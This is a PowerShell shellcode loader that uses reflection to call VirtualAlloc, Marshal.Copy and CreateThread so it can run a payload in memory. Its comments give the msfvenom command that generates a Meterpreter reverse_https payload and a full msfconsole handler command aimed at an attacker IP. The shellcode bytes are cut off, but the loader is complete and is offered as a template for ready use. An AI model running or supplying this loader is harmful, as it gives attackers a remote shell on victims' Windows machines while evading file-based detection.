# Get a Win32 function pointer from the DLL & function name
# E.G. LookupFunc user32.dll MessageBoxA
function LookupFunc {

	Param ($dllName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($dllName)), $functionName))
}

# Get a Win32 function prototype (delegate type) from the array of arguments & the return type of the function
# E.G (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $functionPrototype,
		[Parameter(Position = 1)] [Type] $functionReturnType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $functionPrototype).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $functionReturnType, $functionPrototype).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

# Replace by reverse shell generated with `msfvenom -p windows/(x64/)meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f ps1`
# Start handler with `sudo msfconsole -q -x "use multi/handler; set payload windows/(x64/)meterpreter/reverse_https; set lhost <ATTACKER-IP>; set lport 443; set EXITFUNC thread; exploit;"`
[Byte[]] $shellcode = 0xfc,0x48,0x83...

# Allocate memory space for the shell with Win32 VirtualAlloc and returns the pointer
# We use the reflection technique via GetDelegateForFunctionPointer to call the Win32 function VirtualAlloc from the kernel32.dll assembly in memory
# GetDelegateForFunctionPointer takes the function pointer (using our custom function LookupFunc) and the delegate type (using our custom function getDelegateType)
$shellcode_ptr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.length, 0x3000, 0x40)

# Copy shellcode to allocated memory space
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcode_ptr, $shellcode.length)

# Execute shellcode in a thread with Win32 CreateThread (same method than for VirtualAlloc)
$threadHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$shellcode_ptr,[IntPtr]::Zero,0,[IntPtr]::Zero)

# Don't exit while thread is active with Win32 WaitForSingleObject (same method than for VirtualAlloc)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($threadHandle, 0xFFFFFFFF)
